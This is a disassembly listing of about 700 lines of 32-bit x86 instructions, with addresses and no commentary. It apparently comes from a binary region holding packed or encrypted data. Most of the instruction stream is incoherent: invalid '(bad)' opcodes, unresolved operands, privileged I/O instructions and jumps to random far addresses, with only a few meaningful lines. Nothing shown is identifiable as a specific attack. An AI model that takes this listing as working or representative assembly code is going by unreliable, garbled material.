  408933:	rcr    DWORD PTR [edi-0x48],1
  408936:	inc    edi
  408937:	pop    ecx
  408938:	push   ecx
  408939:	cmp    eax,0xde94c67b
  40893e:	push   ss
  40893f:	fnstcw WORD PTR [ebx+0x38]
  408942:	retf   0xac4d
  408945:	dec    ebp
  408946:	lahf   
  408947:	pop    edi
  408948:	add    DWORD PTR [ebp+0x5],esp
  40894b:	adc    al,0x77
  40894d:	push   cs
  40894e:	or     edx,esp
  408950:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  408952:	mov    ds:0xf4ef2844,al
  408957:	and    DWORD PTR [eax+0x34],edx
  40895a:	inc    esp
  40895b:	bound  ebp,QWORD PTR [esi+0xe69d6d0]
  408961:	xor    eax,DWORD PTR [edx-0x7af99693]
  408967:	outs   dx,BYTE PTR ds:[esi]
  408968:	call   0xed42d791
  40896d:	cmp    dl,BYTE PTR ds:0xba6b8baf
  408973:	lods   eax,DWORD PTR ds:[esi]
  408974:	sti    
  408975:	pusha  
  408976:	cwde   
  408977:	shl    BYTE PTR [eax],0x79
  40897a:	push   0x74
  40897c:	aas    
  40897d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40897e:	imul   esi,DWORD PTR [eax+edx*8-0x6e],0x4d39a327
  408986:	and    dl,BYTE PTR [ebx]
  408988:	push   ebp
  408989:	pushf  
  40898a:	shl    BYTE PTR [eax-0x6032c98b],cl
  408990:	(bad)  
  408991:	fs (bad) 
  408993:	cld    
  408994:	pop    ecx
  408995:	rcr    cl,1
  408997:	sub    BYTE PTR [ebx+0x68],0x4f
  40899b:	mov    al,ds:0x23fc921b
  4089a0:	mov    ds:0x8061f1d8,al
  4089a5:	stos   DWORD PTR es:[edi],eax
  4089a6:	sub    DWORD PTR [ebp+0x6bbca4a7],edi
  4089ac:	or     al,0xc7
  4089ae:	imul   ecx,DWORD PTR [esi],0x2b93546a
  4089b4:	xor    al,0xdb
  4089b6:	(bad)  
  4089b7:	leave  
  4089b8:	call   0x873e4304
  4089bd:	ds pop eax
  4089bf:	pop    edx
  4089c1:	das    
  4089c2:	retf   0x14e3
  4089c5:	sbb    dh,al
  4089c7:	lods   eax,DWORD PTR ds:[esi]
  4089c8:	loopne 0x408965
  4089ca:	leave  
  4089cb:	sub    DWORD PTR [ecx-0x2c],esp
  4089ce:	sbb    dh,BYTE PTR [eax-0x2ee5b01f]
  4089d4:	into   
  4089d5:	ds ja  0x408959
  4089d8:	mov    al,ds:0x3fa8def3
  4089dd:	popf   
  4089de:	gs aam 0xe2
  4089e1:	jnp    0x408976
  4089e3:	div    BYTE PTR [ecx-0x78]
  4089e6:	or     ch,BYTE PTR [edi+0x41149c4d]
  4089ec:	push   ecx
  4089ed:	arpl   WORD PTR [edx-0x1b086ced],ax
  4089f3:	sbb    al,0x5e
  4089f5:	mov    dx,0x5cb
  4089f9:	add    esp,ebx
  4089fb:	in     eax,0x1f
  4089fd:	ficomp WORD PTR [ecx]
  4089ff:	test   eax,0x6f39321f
  408a04:	adc    BYTE PTR [ebp+0x78bd07e1],0xac
  408a0b:	mov    edx,0xd88c5f5e
  408a10:	iret   
  408a11:	dec    esp
  408a12:	push   edx
  408a13:	gs int 0x7e
  408a16:	inc    edi
  408a17:	push   0x501f9943
  408a1c:	push   ebx
  408a1d:	push   ss
  408a1e:	push   cs
  408a1f:	mov    DWORD PTR [edx],esp
  408a21:	stos   DWORD PTR es:[edi],eax
  408a22:	imul   ebp,DWORD PTR [esi+ecx*8+0x6179dc13],0xa
  408a2a:	ins    DWORD PTR es:[edi],dx
  408a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a2c:	inc    esi
  408a2d:	xchg   ecx,eax
  408a2e:	stos   BYTE PTR es:[edi],al
  408a2f:	(bad)  
  408a30:	loopne 0x408aa8
  408a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a33:	test   al,0xe3
  408a35:	pop    esi
  408a36:	and    al,0x2a
  408a38:	sahf   
  408a39:	mov    esp,DWORD PTR [ecx]
  408a3b:	add    eax,0x54a88a5d
  408a40:	inc    ebx
  408a41:	pop    ebp
  408a42:	xor    BYTE PTR [ebx],ch
  408a44:	loopne 0x408a71
  408a46:	(bad)  
  408a48:	xor    esp,ecx
  408a4a:	mov    ah,0xbe
  408a4c:	inc    ebx
  408a4d:	inc    eax
  408a4e:	mov    ebp,0x995a1dc7
  408a53:	push   ss
  408a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a55:	and    DWORD PTR [ecx+0x39],ebp
  408a58:	push   esp
  408a59:	fwait
  408a5a:	add    DWORD PTR [eax-0x5ab25088],ebp
  408a60:	in     al,0x8c
  408a62:	cmc    
  408a63:	xor    eax,0x568dc58c
  408a68:	outs   dx,BYTE PTR ds:[esi]
  408a69:	jae    0x408abc
  408a6b:	sbb    DWORD PTR [edi+0x5a],ebx
  408a6e:	and    ecx,esi
  408a70:	pop    esp
  408a71:	or     DWORD PTR [ecx+0x61f59b17],edi
  408a77:	lods   al,BYTE PTR ds:[esi]
  408a78:	in     al,0x5a
  408a7a:	sti    
  408a7b:	stc    
  408a7c:	mov    eax,DWORD PTR [edi-0xf]
  408a7f:	ret    0x1a3f
  408a82:	test   eax,0xb99b957
  408a87:	(bad)  
  408a88:	jns    0x408ac0
  408a8a:	(bad)  [esi-0x7ed84bf5]
  408a90:	fidivr WORD PTR [ebx+edx*4+0x2bfc59b1]
  408a97:	out    0x39,eax
  408a99:	das    
  408a9a:	out    dx,eax
  408a9b:	out    dx,al
  408a9c:	hlt    
  408a9d:	push   es
  408a9e:	outs   dx,DWORD PTR ds:[esi]
  408a9f:	in     al,0x80
  408aa1:	loopne 0x408a5a
  408aa3:	fiadd  WORD PTR ds:0xada39dfb
  408aa9:	jmp    0xefb78771
  408aae:	mov    ds:0x9a0ff089,eax
  408ab3:	(bad)  
  408ab5:	repz mov ds:0x326ea546,al
  408abb:	les    edi,FWORD PTR [edi+0x39]
  408abe:	push   esp
  408abf:	cld    
  408ac0:	fcom   DWORD PTR [esi-0x46]
  408ac3:	cmp    edi,eax
  408ac5:	fmul   st,st(1)
  408ac7:	mov    dl,0xcf
  408ac9:	pop    edi
  408aca:	or     eax,0xb16735f7
  408acf:	sub    eax,0x1359cd0c
  408ad4:	jb     0x408aa1
  408ad6:	sbb    eax,0x5d4f03a2
  408adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408adc:	mov    ds:0xacc0ca0b,al
  408ae1:	cmp    DWORD PTR [ecx-0x7f5623c0],esp
  408ae7:	add    bh,BYTE PTR ds:0x82c352f3
  408aed:	or     DWORD PTR [ebx],0xfffffff7
  408af0:	test   DWORD PTR [esi+0x947517],esi
  408af6:	stos   BYTE PTR es:[edi],al
  408af7:	lahf   
  408af8:	dec    esi
  408af9:	sub    DWORD PTR [edx-0x4ec900c2],edx
  408aff:	into   
  408b00:	xor    eax,0x4d027261
  408b05:	mov    esi,0xa90b29c3
  408b0a:	gs dec eax
  408b0c:	push   ebx
  408b0d:	push   edi
  408b0e:	(bad)  
  408b0f:	sar    ebx,cl
  408b11:	lahf   
  408b12:	std    
  408b13:	mov    bh,0x88
  408b15:	ret    
  408b16:	mov    cl,0x6b
  408b18:	sti    
  408b19:	aad    0xcc
  408b1b:	dec    ecx
  408b1c:	into   
  408b1d:	daa    
  408b1e:	mov    ebp,0x4b4e30a4
  408b23:	add    al,0x84
  408b25:	xchg   DWORD PTR [edi+ecx*8+0x61],edx
  408b29:	sub    eax,0x9ab82b
  408b2e:	dec    esp
  408b2f:	ret    0xc118
  408b32:	mov    edi,0xe47f2236
  408b37:	cli    
  408b38:	outs   dx,DWORD PTR ds:[esi]
  408b39:	cli    
  408b3a:	and    edx,DWORD PTR [esi+0x32bff28]
  408b40:	jne    0x408ae0
  408b42:	lea    ecx,[esp+eax*4+0x7c]
  408b46:	aam    0x39
  408b48:	mov    ch,0x82
  408b4a:	push   eax
  408b4b:	gs ins DWORD PTR es:[edi],dx
  408b4d:	popf   
  408b4e:	jne    0x408ae4
  408b50:	mov    edi,0x56048ba9
  408b55:	in     eax,0xf2
  408b57:	std    
  408b58:	add    al,0x62
  408b5b:	push   esp
  408b5c:	popf   
  408b5d:	inc    ah
  408b5f:	mov    al,ds:0x81656bf2
  408b64:	js     0x408afa
  408b66:	cli    
  408b67:	jmp    0x4b5b:0xb41741b2
  408b6e:	retf   0x519e
  408b71:	xchg   ebx,eax
  408b72:	push   cs
  408b73:	pop    eax
  408b74:	jg     0x408b70
  408b76:	pop    esp
  408b77:	mov    ecx,0x230d0988
  408b7c:	into   
  408b7d:	arpl   WORD PTR [edx-0x766a9471],cx
  408b83:	fbld   TBYTE PTR [eax+eax*8+0x69]
  408b87:	mul    BYTE PTR [esi+0x48d453e6]
  408b8d:	and    BYTE PTR [edx+0x5362e961],bl
  408b93:	xchg   edx,eax
  408b94:	cmc    
  408b95:	jno    0x408b1c
  408b97:	mov    esi,0xfc51a
  408b9c:	stos   BYTE PTR es:[edi],al
  408b9d:	pop    es
  408b9e:	icebp  
  408b9f:	push   eax
  408ba0:	cmp    BYTE PTR [ecx-0x7b],cl
  408ba3:	std    
  408ba4:	dec    eax
  408ba5:	lock add edx,DWORD PTR ds:0xa28b7366
  408bac:	jbe    0x408c2b
  408bae:	cmp    eax,DWORD PTR [esi-0x7e19151d]
  408bb4:	call   0x253e927b
  408bb9:	push   edx
  408bba:	int3   
  408bbb:	jbe    0x408bbd
  408bbd:	inc    esi
  408bbe:	fistp  DWORD PTR [edx-0x72]
  408bc1:	sub    eax,0xcfeac868
  408bc6:	icebp  
  408bc7:	rcr    BYTE PTR [ebx],1
  408bc9:	ja     0x408ba4
  408bcb:	lea    ebp,[edx+esi*1-0x9]
  408bcf:	sub    dl,BYTE PTR [ecx+eiz*8+0x4688c985]
  408bd6:	stos   BYTE PTR es:[edi],al
  408bd7:	xchg   ebx,eax
  408bd8:	pop    ecx
  408bd9:	fmul   DWORD PTR [edx+0x311296fe]
  408bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408be0:	fmul   st,st(7)
  408be2:	push   esp
  408be3:	ret    
  408be4:	loopne 0x408c4c
  408be6:	shl    DWORD PTR [edx-0x47],1
  408be9:	lods   eax,DWORD PTR ds:[esi]
  408bea:	mov    dl,0xc4
  408bec:	push   ecx
  408bed:	pop    ebp
  408bee:	sbb    bh,BYTE PTR [esi]
  408bf0:	pop    edi
  408bf1:	daa    
  408bf2:	dec    eax
  408bf3:	clc    
  408bf4:	dec    edi
  408bf5:	mov    bh,0xc8
  408bf7:	enter  0x508e,0x75
  408bfb:	fdivrp st(6),st
  408bfd:	dec    ecx
  408bfe:	mov    WORD PTR [ecx+0x14aa54c3],?
  408c04:	and    bl,dl
  408c06:	mov    dh,0xca
  408c08:	ror    DWORD PTR gs:[ebx-0x6aa93a43],1
  408c0f:	rcl    cl,0x8
  408c12:	in     eax,0xe
  408c14:	mov    edi,0x23928ebe
  408c19:	push   ds
  408c1a:	sbb    al,0x6d
  408c1c:	fimul  DWORD PTR [edi-0x1f]
  408c1f:	lahf   
  408c20:	fdiv   DWORD PTR [eax]
  408c22:	mov    bx,0x76f5
  408c26:	mov    eax,edi
  408c28:	mov    bl,0x94
  408c2a:	and    al,0xd7
  408c2c:	iret   
  408c2d:	xor    al,0x5d
  408c2f:	stos   BYTE PTR es:[edi],al
  408c30:	fiadd  WORD PTR [edi+ecx*8+0xd071477]
  408c37:	dec    ebp
  408c38:	out    dx,eax
  408c39:	dec    edx
  408c3a:	pop    eax
  408c3b:	and    BYTE PTR [edi+0x77],ah
  408c3e:	loop   0x408c4d
  408c40:	imul   edi,esp,0x65
  408c43:	mov    ah,0x87
  408c45:	imul   esp,DWORD PTR [ecx+ebx*2+0x49],0xffffff87
  408c4a:	sar    esi,1
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c70:	in     al,dx
  408c71:	lock dec edi
  408c73:	sbb    eax,0x7070d947
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c0a
  408c7d:	add    edx,DWORD PTR [ebx]
  408c7f:	pushf  
  408c80:	ss mov ch,cl
  408c83:	pop    edx
  408c84:	loope  0x408ca5
  408c86:	sub    eax,0xdb5142a2
  408c8b:	xor    ecx,eax
  408c8d:	imul   ebx
  408c8f:	pop    ecx
  408c90:	fwait
  408c91:	jmp    0xbc5de110
  408c96:	test   esi,0x10ae878c
  408c9c:	sub    DWORD PTR [esi-0x561bf9af],edi
  408ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca3:	push   cs
  408ca4:	or     ebp,DWORD PTR ds:0x9031434b
  408caa:	and    eax,0xb56ba5a5
  408caf:	iret   
  408cb0:	xchg   ecx,eax
  408cb1:	pop    edx
  408cb2:	xchg   BYTE PTR [edx+edi*1+0x8be19b],ah
  408cb9:	jmp    0x667b:0x9a89905a
  408cc0:	popa   
  408cc1:	and    BYTE PTR es:0xc337e0df,0xfc
  408cc9:	in     eax,dx
  408cca:	cmp    ebp,ebx
  408ccc:	ins    DWORD PTR es:[edi],dx
  408ccd:	xchg   esp,eax
  408cce:	or     bl,BYTE PTR [edi+eax*2+0x44]
  408cd2:	push   esp
  408cd3:	inc    ebx
  408cd4:	jecxz  0x408ce9
  408cd6:	pushf  
  408cd7:	loope  0x408d32
  408cd9:	sbb    eax,DWORD PTR [esi-0x2a741c56]
  408cdf:	sub    BYTE PTR gs:[edi],bl
  408ce2:	imul   ebp,DWORD PTR [ebp-0x70],0x4a9febde
  408ce9:	mov    ebp,0x58a7096a
  408cee:	cmp    DWORD PTR [esi+0x21],0x70
  408cf2:	sar    DWORD PTR fs:[edi],cl
  408cf5:	mov    eax,ds:0xc50af108
  408cfa:	(bad)  
  408cfb:	push   ss
  408cfc:	js     0x408c90
  408cfe:	jno    0x408d55
  408d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d01:	mov    edx,0xb6173154
  408d06:	dec    eax
  408d07:	ret    0xac0
  408d0a:	mov    DWORD PTR [ebx+esi*2+0x48],ecx
  408d0e:	nop
  408d0f:	mov    ds:0x7c053d2,al
  408d14:	fnstcw WORD PTR [ebp+0x62a9961f]
  408d1a:	or     ebx,edi
  408d1c:	mov    ss,esp
  408d1e:	popa   
  408d1f:	arpl   si,sp
  408d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d22:	fs xor ch,al
  408d25:	inc    edx
  408d26:	retf   
  408d27:	rcl    DWORD PTR [edi],1
  408d29:	outs   dx,BYTE PTR ds:[esi]
  408d2a:	inc    edi
  408d2b:	inc    esp
  408d2c:	adc    ebp,DWORD PTR es:[edi]
  408d2f:	imul   edx,ebp,0xbb79286e
  408d35:	inc    edi
  408d36:	sbb    BYTE PTR [ecx],ch
  408d38:	aam    0xdf
  408d3a:	sbb    bh,BYTE PTR ds:0xb20270df
  408d41:	in     al,dx
  408d42:	test   BYTE PTR [eax-0x2b],bl
  408d45:	mov    ecx,0xd6962bb
  408d4a:	xchg   ecx,eax
  408d4b:	pop    ecx
  408d4c:	shl    DWORD PTR [ebx+0x3f],0x17
  408d50:	inc    ebp
  408d51:	cmp    eax,0x2e9ba664
  408d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d57:	add    esp,0x6ac77447
  408d5d:	call   0x663b:0xffc21ce6
  408d64:	adc    eax,DWORD PTR [edx-0x672d9fb1]
  408d6a:	scas   eax,DWORD PTR es:[edi]
  408d6b:	xchg   edi,eax
  408d6c:	jnp    0x408d49
  408d6e:	je     0x408d3a
  408d70:	rcr    DWORD PTR [ecx+0x7225d1c9],cl
  408d76:	add    al,0x61
  408d78:	int    0x46
  408d7a:	and    eax,0x24bae72f
  408d7f:	ins    DWORD PTR es:[edi],dx
  408d80:	mov    esp,0xf5bd935f
  408d85:	xchg   ebx,eax
  408d86:	inc    ecx
  408d87:	jge    0x408d11
  408d89:	jp     0x408d22
  408d8b:	cmp    dl,BYTE PTR [edx-0xe33ce80]
  408d91:	push   eax
  408d92:	sub    BYTE PTR ds:0x1b8d84d3,0x4d
  408d99:	dec    ebx
  408d9a:	stos   BYTE PTR es:[edi],al
  408d9b:	add    al,0xa4
  408d9d:	dec    esp
  408d9e:	mov    dl,0x4e
  408da0:	pop    esi
  408da1:	xchg   ebx,eax
  408da2:	sbb    al,0xf2
  408da4:	xchg   dl,bl
  408da6:	out    dx,eax
  408da7:	addr16 sbb eax,0xe57c054a
  408dad:	push   ecx
  408dae:	ret    0xac9d
  408db1:	mov    WORD PTR gs:[eax],?
  408db4:	inc    edx
  408db5:	add    edi,DWORD PTR [ebp+0x6b5db23b]
  408dbb:	sub    DWORD PTR [ecx+0x3d297ab8],ebp
  408dc1:	lods   al,BYTE PTR ds:[esi]
  408dc2:	clc    
  408dc3:	ficom  DWORD PTR [ebx]
  408dc5:	ds in  eax,dx
  408dc7:	das    
  408dc8:	clc    
  408dc9:	in     eax,0x31
  408dcb:	push   0xffffffc4
  408dcd:	je     0x408df9
  408dcf:	mov    al,ds:0x44237dda
  408dd4:	adc    al,0x95
  408dd6:	pop    eax
  408dd7:	jb     0x408dfe
  408dd9:	test   eax,0x68c85229
  408dde:	xor    BYTE PTR [edx+esi*8-0x27],bl
  408de2:	pop    es
  408de3:	cdq    
  408de4:	mov    ebp,0x7ee71047
  408de9:	xlat   BYTE PTR ds:[ebx]
  408dea:	sbb    ch,BYTE PTR [esi+0x70]
  408ded:	repz sub eax,0x3206c9af
  408df3:	fwait
  408df4:	sbb    dh,BYTE PTR [esi+ebp*8+0x32]
  408df8:	cmp    BYTE PTR [edx+0x3d24dc69],bl
  408dfe:	sub    DWORD PTR [esi+ebx*8+0x1fae6d7],edx
  408e05:	jbe    0x408e70
  408e07:	jmp    0x7cf4:0x8e0a60d
  408e0e:	aas    
  408e0f:	xchg   DWORD PTR [edx],ebp
  408e11:	rcl    DWORD PTR [eax],1
  408e13:	mov    ebp,0xbe80a2a7
  408e18:	(bad)  
  408e19:	(bad)  [ebx]
  408e1b:	adc    ebx,DWORD PTR [esi]
  408e1d:	iret   
  408e1e:	sti    
  408e1f:	and    DWORD PTR [ebx],edi
  408e21:	aaa    
  408e22:	xchg   ecx,eax
  408e23:	rcr    DWORD PTR [eax+0x72],0x4a
  408e27:	pop    ebp
  408e28:	add    bh,BYTE PTR [edi+0x57]
  408e2b:	xor    DWORD PTR [edx+0x77],esi
  408e2e:	push   eax
  408e2f:	add    DWORD PTR [ecx],edx
  408e31:	loope  0x408dbe
  408e33:	sub    eax,0xcb00ad5c
  408e38:	hlt    
  408e39:	cmp    edx,eax
  408e3b:	adc    DWORD PTR [ebx],0x48
  408e3e:	sbb    eax,0x8aa342e6
  408e43:	addr16 int 0x48
  408e46:	add    al,BYTE PTR [ecx]
  408e48:	ja     0x408dd3
  408e4a:	or     BYTE PTR [edi+0x2029573d],al
  408e50:	pop    DWORD PTR [edi+ebp*4-0x70]
  408e54:	lahf   
  408e55:	in     eax,0x63
  408e57:	int    0xbd
  408e59:	scas   al,BYTE PTR es:[edi]
  408e5a:	mov    ds:0x252db639,al
  408e5f:	iret   
  408e60:	sub    DWORD PTR [edi],edi
  408e62:	ficomp DWORD PTR [edi]
  408e64:	jbe    0x408e18
  408e66:	pushf  
  408e67:	xor    bh,BYTE PTR [eax+0x7eea7109]
  408e6d:	pop    esi
  408e6e:	push   edi
  408e6f:	push   es
  408e70:	mov    ch,0xe0
  408e72:	push   esi
  408e73:	pop    esi
  408e74:	adc    al,0xa8
  408e76:	data16 out 0x28,al
  408e79:	mov    ebx,0xc3a0f419
  408e7e:	aas    
  408e7f:	pop    ss
  408e80:	pop    ecx
  408e81:	push   esi
  408e82:	in     al,dx
  408e83:	push   0x22cc0ad9
  408e88:	cmp    DWORD PTR [edx+0x7d31f4df],ecx
  408e8e:	cmp    eax,0x5eb66c73
  408e93:	adc    al,0x86
  408e95:	popf   
  408e96:	xchg   DWORD PTR [ebp+0x60],esi
  408e99:	push   ecx
  408e9a:	pusha  
  408e9b:	mov    al,ds:0xcefcc33f
  408ea0:	sub    ebp,DWORD PTR [ecx-0x33]
  408ea3:	mov    ebp,0xd2f1261
  408ea8:	adc    DWORD PTR [esi-0x1e2626fa],0x40
  408eaf:	push   DWORD PTR [edi-0x6b1f6e85]
  408eb5:	mov    bl,0xba
  408eb7:	mov    ch,BYTE PTR [eax+0x1c08581f]
  408ebd:	xchg   edx,eax
  408ebe:	icebp  
  408ebf:	sub    esp,0x2a19a93e
  408ec5:	loop   0x408ed5
  408ec7:	mov    ds:0xcbaf1803,eax
  408ecc:	jae    0x408e54
  408ece:	pushf  
  408ecf:	(bad)  
  408ed0:	aad    0x37
  408ed2:	pusha  
  408ed3:	test   eax,0xaac66e49
  408ed8:	jno    0x408e69
  408eda:	imul   eax,DWORD PTR [edx+ebx*1+0x1aee0ea],0xffffffb1
  408ee2:	adc    BYTE PTR [edx-0x7c],0xbd
  408ee6:	push   esp
  408ee7:	popa   
  408ee8:	ret    
  408ee9:	mov    bh,0xff
  408eeb:	add    BYTE PTR [eax-0x3c910d4e],dl
  408ef1:	xchg   esp,eax
  408ef2:	lods   al,BYTE PTR ds:[esi]
  408ef3:	js     0x408f0c
  408ef5:	mov    bh,0x1
  408ef7:	push   edi
  408ef8:	ds dec edi
  408efa:	test   al,0x6e
  408efc:	fdivr  QWORD PTR [edx]
  408efe:	jg     0x408f34
  408f00:	push   esp
  408f01:	test   al,0xef
  408f03:	mov    ds:0x17bec2e4,eax
  408f08:	push   0xffffffb2
  408f0a:	ror    DWORD PTR [esi+0x57],1
  408f0d:	test   eax,0x98cb0e56
  408f12:	(bad)  
  408f13:	jp     0x408ef2
  408f15:	xchg   esi,eax
  408f16:	mov    WORD PTR ds:0x14be00e2,ss
  408f1c:	call   0x4b506260
  408f21:	cmp    al,0xba
  408f23:	in     eax,0xa1
  408f25:	xor    eax,0xc1f8cb0a
  408f2a:	mov    ds:0x94250eac,eax
  408f2f:	push   eax
  408f30:	xor    ebp,DWORD PTR [ebp*8+0x64d65ca6]
  408f37:	pop    edx
  408f38:	cld    
  408f39:	or     DWORD PTR [eax+0x2c],0x777b160d
  408f40:	cs mov dh,0xa7
  408f43:	pop    esi
  408f44:	test   al,0x3c
  408f46:	or     al,0xc6
  408f48:	pop    ecx
  408f49:	jb     0x408f35
  408f4b:	dec    esi
  408f4c:	cmp    edx,DWORD PTR [eax-0x25ba1a0b]
  408f52:	cld    
  408f53:	ror    DWORD PTR [edx+0x5f7b9a6],0x32
  408f5a:	pop    es
  408f5b:	ja     0x408f14
  408f5d:	add    dh,cl
  408f5f:	ja     0x408fb4
  408f61:	mov    bl,0x68
  408f63:	aaa    
  408f64:	sahf   
  408f65:	mov    bl,0x2b
  408f67:	push   esi
  408f68:	rcl    ebx,1
  408f6a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f6c:	scas   eax,DWORD PTR es:[edi]
  408f6d:	mov    edx,0xeeb99156
  408f72:	mov    WORD PTR [ebx+eiz*1-0x7e],ds
  408f76:	sub    BYTE PTR [eax-0x31099720],bl
  408f7c:	lods   eax,DWORD PTR ds:[esi]
  408f7d:	loopne 0x408fab
  408f7f:	lods   eax,DWORD PTR ds:[esi]
  408f80:	stc    
  408f81:	clc    
  408f82:	jo     0x408f2c
  408f84:	pop    ebp
  408f85:	sub    cl,BYTE PTR [ebx+eiz*4-0x52382fc7]
  408f8c:	xchg   edi,eax
  408f8d:	or     al,0x67
  408f8f:	mov    dh,BYTE PTR [esi-0x5b]
  408f92:	mov    edx,0x7e74b1ee
  408f97:	xor    ch,bh
  408f99:	sbb    esi,DWORD PTR [eax+ebp*1-0x4ed6e3c3]
  408fa0:	mov    eax,ds:0x2da02acd
  408fa5:	mov    esp,0xf657600d
  408faa:	das    
  408fab:	dec    edx
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xb51937f3
  408fc6:	leave  
  408fc7:	pop    ds
  408fc8:	mov    eax,0x7070e677
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f6a
  408fd2:	jl     0x408fe9
  408fd4:	std    
  408fd5:	sahf   
  408fd6:	cwde   
  408fd7:	dec    esp
  408fd8:	jecxz  0x408f73
  408fda:	clc    
  408fdb:	scas   eax,DWORD PTR es:[edi]
  408fdc:	push   ebp
  408fdd:	lds    ebp,FWORD PTR [ecx-0x5dc169bc]
  408fe3:	sbb    ecx,DWORD PTR [ebx+0x58ebc079]
  408fe9:	sbb    al,0xa1
  408feb:	mov    esi,0x2bfcdd0b
  408ff0:	gs xchg edx,eax
  408ff2:	jmp    0x72d8bde8
  408ff7:	mov    cl,0x48
  408ff9:	sbb    BYTE PTR [ebx*8-0x4b464d6],cl
  409000:	hlt    
  409001:	pop    es
  409002:	push   ebx
  409003:	call   FWORD PTR ds:0x70ac9d7a
  409009:	ficomp WORD PTR [edx]
  40900b:	jmp    0x409009
  40900d:	inc    ecx
  40900e:	push   0xbb6a494a
  409013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409014:	jb     0x409074
  409016:	xchg   ecx,eax
  409017:	(bad)  
  409018:	xor    eax,0x10ac9fe2
  40901d:	pop    edi
  40901e:	fldcw  WORD PTR [eax+0x2f]
  409021:	(bad)  
  409022:	aad    0x13
  409024:	sub    ah,cl
  409026:	xchg   BYTE PTR [edi-0x3cabc6d4],bl
  40902c:	lods   al,BYTE PTR ds:[esi]
  40902d:	jb     0x408fd7
  40902f:	or     al,0x38
  409031:	inc    edx
  409032:	or     BYTE PTR [edx],al
  409034:	out    dx,al
  409035:	inc    ecx
  409036:	out    0xd4,al
  409038:	fistp  WORD PTR [esi+edi*1+0x38e24f6e]
  40903f:	dec    ebx
  409040:	or     esi,0x64
  409043:	ret    0x3c89
  409046:	adc    eax,0x2e183ff6
  40904b:	das    
  40904c:	push   eax
  40904d:	jno    0x409027
  40904f:	dec    esi
  409050:	mov    esi,0xfaa7e2b4
  409055:	jp     0x409019
  409057:	lods   al,BYTE PTR ds:[esi]
  409058:	call   0x3825:0x94151206
  40905f:	push   eax
  409060:	mov    ds:0x28e6a597,al
  409065:	rcr    BYTE PTR [ebp+0x31],0x65
  409069:	pop    ebp
  40906a:	or     eax,0x3f3f6049
  40906f:	pop    ecx
  409070:	inc    ebx
  409071:	int    0x53
  409073:	jge    0x409061
  409075:	pop    ecx
  409076:	ins    DWORD PTR es:[edi],dx
  409077:	and    DWORD PTR [ecx],ecx
  409079:	cmp    ebp,ebx
  40907b:	sti    
  40907c:	mov    ch,0x23
  40907e:	shr    BYTE PTR [ecx],cl
  409080:	icebp  
  409081:	ss ss js 0x409068
  409085:	sub    BYTE PTR [esi+0x4f6d188e],ah
  40908b:	mov    edx,0x9428cf5a
  409090:	xchg   ebx,eax
  409091:	test   BYTE PTR [ebp-0x640bb428],bh
  409097:	cmp    ecx,DWORD PTR [ebp+0x4]
  40909a:	ja     0x409042
  40909c:	mov    cl,0x5d
  40909e:	fiadd  WORD PTR [esi]
  4090a0:	fwait
  4090a1:	cmp    DWORD PTR [esi],eax
  4090a3:	aam    0xb0
  4090a5:	mov    BYTE PTR [eax-0x2f],bh
  4090a8:	mov    ebx,0xd6595805
  4090ad:	fcmove st,st(7)
  4090af:	sub    dl,BYTE PTR [edx+0x4a]
  4090b2:	loope  0x4090cf
  4090b4:	adc    BYTE PTR [esi+0x37c63770],bh
  4090ba:	fld    st(7)
  4090bc:	or     DWORD PTR [edi-0x2a],0xca6f1fef
  4090c3:	mov    edx,0xdae5d236
  4090c8:	add    BYTE PTR [ebp+0x42],dh
  4090cb:	test   eax,0xad74eba6
  4090d0:	jg     0x409143
  4090d2:	popw   ss
  4090d4:	pusha  
  4090d5:	outs   dx,DWORD PTR ds:[esi]
  4090d6:	xor    ecx,DWORD PTR [edi+0x472d5eb8]
  4090dc:	xlat   BYTE PTR ds:[ebx]
  4090dd:	arpl   WORD PTR [ebp-0x26],dx
  4090e0:	lds    edx,FWORD PTR [esi+0x6e]
  4090e3:	jmp    0x40910f
  4090e5:	or     DWORD PTR [edx+0x74aaea9d],0xccc894ec
  4090ef:	xor    BYTE PTR [edx],cl
  4090f1:	xor    edx,DWORD PTR [eax+ebx*4]
  4090f4:	fmul   QWORD PTR [edi-0x41bedc2f]
  4090fa:	add    eax,0xa0235ca
  4090ff:	lods   al,BYTE PTR ds:[esi]
  409100:	xchg   esi,eax
  409101:	pop    ebx
  409102:	sub    edx,esp
  409104:	mov    WORD PTR [ebp-0x3c],ds
  409107:	jbe    0x4090cf
  409109:	imul   edi,ebp,0xba02f434
  40910f:	pop    esp
  409110:	bound  ecx,QWORD PTR [esi]
  409112:	pop    eax
  409113:	jl     0x4090b8
  409115:	in     eax,0xfa
  409117:	in     al,dx
  409118:	mov    eax,0x714f5263
  40911d:	fmul   QWORD PTR [eax+0x59a07f86]
  409123:	aad    0xfb
  409125:	cmp    DWORD PTR [edx+0x7a],0x3c3411e3
  40912c:	sub    bl,ch
  40912e:	mov    ?,WORD PTR ds:0x5c52d6d8
  409134:	nop
  409135:	dec    ecx
  409136:	popf   
